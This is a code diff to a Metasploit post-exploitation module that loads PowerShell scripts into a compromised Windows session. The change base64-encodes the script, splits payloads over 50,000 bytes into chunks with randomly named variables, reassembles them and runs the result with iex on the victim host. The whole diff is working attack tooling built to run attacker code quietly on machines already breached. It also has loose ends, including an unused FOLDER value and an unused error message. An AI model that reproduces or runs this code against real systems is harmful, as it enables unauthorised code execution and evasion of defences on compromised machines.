@@ -37,22 +37,46 @@ class Metasploit3 < Msf::Post
   end
 
   def run
+    # Get datastore values
     script_in = read_script(datastore['SCRIPT'])
+    folder_in = read_script(datastore['FOLDER'])
 
     # Convert expression to unicode
     unicode_expression = Rex::Text.to_unicode(script_in)
 
     # Base64 encode the unicode expression
     encoded_expression = Rex::Text.encode_base64(unicode_expression)
+    # If the encoded script size is > 50000 bytes, launch a stager
+    if (encoded_expression.size > 50000)
+      print_error("Compressed size: #{encoded_expression.size} This script requres a stager")
+      error_msg =  "Compressed size may cause command to exceed "
+      arr = encoded_expression.chars.each_slice(50000).map(&:join)
+      vararray = []
 
-    session.shell_command("$script = \"#{encoded_expression}\"")
+      for slice in arr 
+        variable = Rex::Text.rand_text_alpha(8)
+        vararray << variable
+        session.shell_command("$#{variable} = \"#{slice}\"")
+      end
+      linkvars = ''
+      for var in vararray
+        linkvars = linkvars + " + $" + var
+      end
+      linkvars.slice!(0..2)
+      session.shell_command("$script = #{linkvars}")
+      print_good("Loaded " + vararray.count.to_s + " chunks into stager")
+      session.shell_command("$script")
+    else
+      print_good("Compressed size: #{encoded_expression.size}")
+      session.shell_command("$script = \"#{encoded_expression}\"")
+    end
     session.shell_command("$decscript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($script))")
-    session.shell_command("$scriptbtye  = [System.Text.Encoding]::UTF8.GetBytes(\"$decscript\")")
-    session.shell_command("$scriptbtyebas = [System.Convert]::ToBase64String($scriptbtye) ")
-    session.shell_command("$scriptbtyebase = ([System.Convert]::FromBase64String($scriptbtyebas))")
-    session.shell_command("([System.Text.Encoding]::UTF8.GetString($scriptbtyebase))|iex")
+    session.shell_command("$scriptby  = [System.Text.Encoding]::UTF8.GetBytes(\"$decscript\")")
+    session.shell_command("$scriptbybase = [System.Convert]::ToBase64String($scriptby) ")
+    session.shell_command("$scriptbybasefull = ([System.Convert]::FromBase64String($scriptbybase))")
+    session.shell_command("([System.Text.Encoding]::UTF8.GetString($scriptbybasefull))|iex")
     print_good("Modules loaded")
   end
 
-end
 
+end
